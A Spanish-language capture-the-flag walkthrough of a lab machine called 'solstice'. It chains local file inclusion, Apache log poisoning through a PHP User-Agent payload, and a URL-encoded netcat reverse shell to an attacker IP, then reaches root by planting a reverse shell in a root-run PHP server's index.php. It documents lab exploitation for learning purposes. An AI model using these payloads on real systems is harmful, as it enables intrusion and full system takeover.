PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http

-En el puerto 80 no hay nada interesante

-En el puerto 8593 encontramos esta URL:
	-http://192.168.1.191:8593/index.php?book=list

-Listamos el /etc/passwd:
	-http://192.168.1.137:8593/index.php?book=../../../../etc/passwd
		LO VEMOS!!

-Listamos los logs de Apache:
	-http://192.168.1.137:8593/index.php?book=../../../../var/log/apache2/access.log
		LOS VEMOS!!

-Me doy cuenta de que al recargar la página en la URL de los logs de apache (../../../../var/log/apache2/access.log) , no queda registrado el log como normalmente ocurre. Solo se registran los logs en las peticiones que hacemos a la URL del puerto 80:
	192.168.1.137/probandoooo
		"GET /probandooooo HTTP/1.1"

-Tenemos que inyectar el código malicioso en la web del puerto 80 y ejecutar comandos en la URL de los logs, aprovechando el LFI:
	1-Interceptamos la petición en:
		-http://192.168.1.137/test
	2-Probamos a ejecutar un comando:
		GET /test HTTP/1.1
		Host: 192.168.1.137
		User-Agent: <?php system('id'); ?>
			-Nos vamos a la ruta de los logs (access.log):
				uid=33(www-data) gid=33(www-data) groups=33(www-data)
	3-Inyectamos una wenshell y nos mandamos una RS
		![[Pasted image 20250502222230.png]]
		-Reverse Shell:
			-http://192.168.1.137:8593/index.php?book=../../../../var/log/apache2/access.log&cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|sh%20-i%202%3E%261|nc%20192.168.1.135%201234%20%3E/tmp/f
				www-data@solstice:/$ whoami
				www-data

## Escalada de Privilegios

-Tenemos permisos SUID sobre la siguiente carpteta:
	/var/tmp/sv

-Dentro de la carpeta encontramos un archivo:
	-index.php

-Vemos los procesos, filtrando por sv:
	**-ps -faux | grep sv**
		root       392  0.0  0.0   2388   760 ?        Ss   15:58   0:00      \_ /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
		root       417  0.0  2.1 196936 21868 ?        S    15:58   0:00          \_ /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/

-Parece que el usuario root está levantando un servidor web con php dónde aloja el archivo 'index.php'

-Inyectamos una RS en PHP en el archivo index.php y hacemos una petición con curl desde la máquina víctima al localhost:57, que es dónde está corriendo el archivo:
	-curl http://localhost:57/
		root@solstice:/# whoami
		root

